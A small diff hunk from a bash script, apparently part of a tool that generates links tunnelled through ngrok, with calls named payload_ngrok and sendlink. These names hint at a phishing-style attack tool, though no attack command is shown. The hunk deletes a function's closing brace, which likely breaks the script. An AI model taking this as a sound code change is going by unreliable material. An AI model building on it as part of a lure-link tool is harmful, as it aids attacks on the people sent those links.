@@ -246,7 +246,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
-}
+
 
 start1() {
 if [[ -e sendlink ]]; then
